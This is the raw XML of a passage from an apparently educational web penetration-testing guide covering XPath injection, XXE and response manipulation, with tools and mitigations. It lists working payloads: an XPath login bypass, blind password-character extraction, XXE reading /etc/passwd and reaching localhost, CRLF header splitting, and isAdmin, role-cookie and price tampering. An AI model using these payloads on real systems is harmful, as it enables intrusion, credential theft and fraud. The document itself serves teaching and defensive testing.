    <w:p w14:paraId="216B2704" w14:textId="77777777" w:rsidR="00871CD4" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Bypass authentication by altering XPath query logic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C672289" w14:textId="77777777" w:rsidR="00871CD4" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Vulnerable query: //users/user[username/text()=’INPUT’ and password/text()=’INPUT’]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44615429" w14:textId="3782B504" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Payload: ‘ or ‘1’=’1 → returns TRUE.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53AAD694" w14:textId="77777777" w:rsidR="00871CD4" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Blind XPath Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B0FC8D" w14:textId="77777777" w:rsidR="00871CD4" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Infer data using true/false queries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEAC96A" w14:textId="77777777" w:rsidR="00871CD4" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Example: ‘ or count(//user) &gt; 1 or ‘a’=’b.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3302F4A6" w14:textId="5B440117" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Extract chars: ‘ or substring(//user[1]/password,1,1)=’a.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC691F9" w14:textId="77777777" w:rsidR="00A7533A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>XXE Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9441D4" w14:textId="77777777" w:rsidR="00A7533A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Inject ENTITY definitions into XML.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36812940" w14:textId="77777777" w:rsidR="00A7533A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>File read:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF12F49" w14:textId="77777777" w:rsidR="00A7533A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SYSTEM </w:t>
      </w:r>
      <w:hyperlink r:id="rId24" w:history="1">
        <w:r w:rsidRPr="009F2340">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>file:///etc/passwd</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>&gt; ]&gt;&lt;data&gt;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>;&lt;/data&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D87071" w14:textId="77777777" w:rsidR="00A7533A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>SSRF:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A1D2B8" w14:textId="1080A64B" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">&lt;!DOCTYPE foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SYSTEM </w:t>
      </w:r>
      <w:hyperlink r:id="rId25" w:history="1">
        <w:r w:rsidRPr="009F2340">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://127.0.0.1:8080/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>&gt; ]&gt;&lt;data&gt;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>;&lt;/data&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421D87C7" w14:textId="77777777" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="006E278A"/>
    <w:p w14:paraId="01EEBA35" w14:textId="77777777" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (Billion Laughs): nested ENTITY expansion.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E6A3FB9" w14:textId="2C2508D3" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005A7039">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="174" w:name="_Toc208408645"/>
      <w:r>
        <w:t>Tools</w:t>
      </w:r>
      <w:bookmarkEnd w:id="174"/>
    </w:p>
    <w:p w14:paraId="744D700C" w14:textId="77777777" w:rsidR="009C31F8" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Burp Suite Pro (active scanner)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498D521C" w14:textId="77777777" w:rsidR="005A7039" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>wfuzz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>fuzzdb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (XML fuzz strings)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254E0931" w14:textId="77777777" w:rsidR="005A7039" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>XXEinjector</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (XXE automation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C62B27" w14:textId="51758A78" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Custom Python scripts for crafted XML requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38725F18" w14:textId="0CE9F51C" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005A7039">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="175" w:name="_Toc208408646"/>
      <w:r>
        <w:t>Mitigation Strategies</w:t>
      </w:r>
      <w:bookmarkEnd w:id="175"/>
    </w:p>
    <w:p w14:paraId="7C86CCEF" w14:textId="77777777" w:rsidR="005A7039" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Disable DTDs and external ENTITY resolution in parsers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A11EFA" w14:textId="77777777" w:rsidR="005A7039" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use parameterized XPath queries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2370F035" w14:textId="77777777" w:rsidR="000D7552" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Escape XML special characters before insertion.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25BA389D" w14:textId="77777777" w:rsidR="000D7552" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Validate structure with XSD schemas.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F238E44" w14:textId="1ACC2BD5" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Apply least privilege principle to file/network access.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2215AE7B" w14:textId="6BC69AC2" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="000D7552">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="176" w:name="_Toc208408647"/>
      <w:r>
        <w:t>Attack → Detection Map</w:t>
      </w:r>
      <w:bookmarkEnd w:id="176"/>
    </w:p>
    <w:p w14:paraId="34D36E1D" w14:textId="77777777" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="006E278A">
      <w:r>
        <w:t>Content Injection → Payload: &lt;test&gt;probe&lt;/test&gt; → Extra nodes appear.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3428AD" w14:textId="30A88D81" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="006E278A">
      <w:r>
        <w:t>XPath Injection → Payload: ‘ or ‘1’=’1 → Login bypass.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22093C08" w14:textId="77777777" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="006E278A">
      <w:r>
        <w:t>Blind XPath → Payload: substring(//user[1]/pwd,1,1) → Extract characters.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5750C7CF" w14:textId="4B5659E1" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="006E278A">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">XXE File Read → Payload: &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SYSTEM </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:history="1">
        <w:r w:rsidRPr="009F2340">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>file:///etc/passwd</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>&gt; → File disclosure.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510E4649" w14:textId="33EF45FA" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="006E278A">
      <w:r>
        <w:t xml:space="preserve">XXE SSRF → Payload: &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SYSTEM </w:t>
      </w:r>
      <w:hyperlink r:id="rId27" w:history="1">
        <w:r w:rsidRPr="009F2340">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://127.0.0.1/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>&gt; → Internal access.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BAB428D" w14:textId="77777777" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="006E278A">
      <w:r>
        <w:t xml:space="preserve">XXE </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> → Payload: Billion Laughs entity expansion → Parser crash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE93AFF" w14:textId="5CFE82E6" w:rsidR="006E278A" w:rsidRDefault="006E278A" w:rsidP="006E278A"/>
    <w:p w14:paraId="6A88F19F" w14:textId="1D2FB772" w:rsidR="006E278A" w:rsidRDefault="00C16006" w:rsidP="00C16006">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="177" w:name="_Toc208408648"/>
      <w:r>
        <w:t xml:space="preserve">Response </w:t>
      </w:r>
      <w:r w:rsidR="00E40E61">
        <w:t>Manipulation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="177"/>
      <w:r w:rsidR="00E40E61">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727E335A" w14:textId="0044D210" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="00BE02F4">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="178" w:name="_Toc208408649"/>
      <w:r>
        <w:t>What is Response Manipulation?</w:t>
      </w:r>
      <w:bookmarkEnd w:id="178"/>
    </w:p>
    <w:p w14:paraId="6E84FAFB" w14:textId="77777777" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Response Manipulation occurs when attackers tamper with server responses or how the browser interprets them. It targets HTTP response bodies, hidden fields, cookies, and headers. Impacts include privilege escalation, bypassing controls, injecting headers (CRLF), and tampering with redirects or resources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9D4F9D" w14:textId="5EE7A799" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="00A77DF9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="179" w:name="_Toc208408650"/>
      <w:r>
        <w:t>Types of Response Manipulation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="179"/>
    </w:p>
    <w:p w14:paraId="361EE02E" w14:textId="77777777" w:rsidR="00A77DF9" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Client-Side Resource Manipulation: Modifying hidden fields, JavaScript variables, or resources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="340E4989" w14:textId="77777777" w:rsidR="00A77DF9" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Parameter Tampering in Responses: Changing state/price/role values in hidden fields or JSON.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C33466" w14:textId="1051FAC6" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>HTTP Response Header Injection / CRLF Injection: Using CRLF sequences to split headers and inject malicious ones.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BDF908" w14:textId="2FC253EC" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="00A77DF9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="180" w:name="_Toc208408651"/>
      <w:r>
        <w:t>How It Works</w:t>
      </w:r>
      <w:bookmarkEnd w:id="180"/>
    </w:p>
    <w:p w14:paraId="61C26C72" w14:textId="77777777" w:rsidR="00A77DF9" w:rsidRDefault="00C16006" w:rsidP="00C16006">
      <w:r>
        <w:t>Applications often trust client-side values reflected in responses. When these values are not validated or encoded, attackers can:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DC21EEB" w14:textId="77777777" w:rsidR="00665B58" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Change roles or flags</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3BBE27" w14:textId="77777777" w:rsidR="00665B58" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Inject headers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50226F64" w14:textId="234F1740" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Manipulate caching and redirects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54182951" w14:textId="504CEA56" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="00665B58">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="181" w:name="_Toc208408652"/>
      <w:r>
        <w:t>Detection Workflow</w:t>
      </w:r>
      <w:bookmarkEnd w:id="181"/>
    </w:p>
    <w:p w14:paraId="33472EED" w14:textId="77777777" w:rsidR="00665B58" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Intercept responses with Burp/ZAP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71AC0B78" w14:textId="77777777" w:rsidR="00665B58" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Look for hidden fields, cookies, JSON values, custom headers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A49B80D" w14:textId="77777777" w:rsidR="00665B58" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Tamper with values (roles, flags, prices).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541FF7C2" w14:textId="77777777" w:rsidR="00665B58" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Inject CRLF sequences (%0d%0a) into reflected values.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CFC2BA0" w14:textId="22167F57" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Observe application behavior (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> bypass, header injection).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21227DC2" w14:textId="426ACF0D" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="00950E8C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="182" w:name="_Toc208408653"/>
      <w:r>
        <w:t>Exploitation Techniques</w:t>
      </w:r>
      <w:bookmarkEnd w:id="182"/>
    </w:p>
    <w:p w14:paraId="15716E54" w14:textId="77777777" w:rsidR="00950E8C" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Hidden Field Manipulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49DB00B0" w14:textId="7E6CF1B9" w:rsidR="00C16006" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Modify hidden field in response:</w:t>
      </w:r>
      <w:r w:rsidR="00950E8C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;input type=’hidden’ name=’</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>isAdmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>’ value=’false’&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00950E8C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>→ Change to ‘true’, resubmit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B863F6" w14:textId="77777777" w:rsidR="00C02D58" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Cookie/Flag Manipulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E594F9" w14:textId="77777777" w:rsidR="00697B9D" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Response sets cookie:</w:t>
      </w:r>
      <w:r w:rsidR="00C02D58">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Set-Cookie: role=user</w:t>
      </w:r>
      <w:r w:rsidR="00C02D58">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>→ Modify to: Set-Cookie: role=admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319A3E19" w14:textId="77777777" w:rsidR="00697B9D" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Price/Parameter Manipulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AC64DE" w14:textId="77777777" w:rsidR="00697B9D" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>E-commerce example:</w:t>
      </w:r>
      <w:r w:rsidR="00697B9D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;input type=’hidden’ name=’price’ value=’100’&gt;</w:t>
      </w:r>
      <w:r w:rsidR="00697B9D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>→ Change to ‘1’ and resubmit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29878ECE" w14:textId="77777777" w:rsidR="00697B9D" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>CRLF Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE7C689" w14:textId="77777777" w:rsidR="00697B9D" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Inject %0d%0a into reflected values to split headers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41936F04" w14:textId="77777777" w:rsidR="00A73954" w:rsidRDefault="00C16006" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Example:</w:t>
      </w:r>
      <w:r w:rsidR="00A73954">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId28" w:history="1">
        <w:r w:rsidR="00A73954" w:rsidRPr="00A03022">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
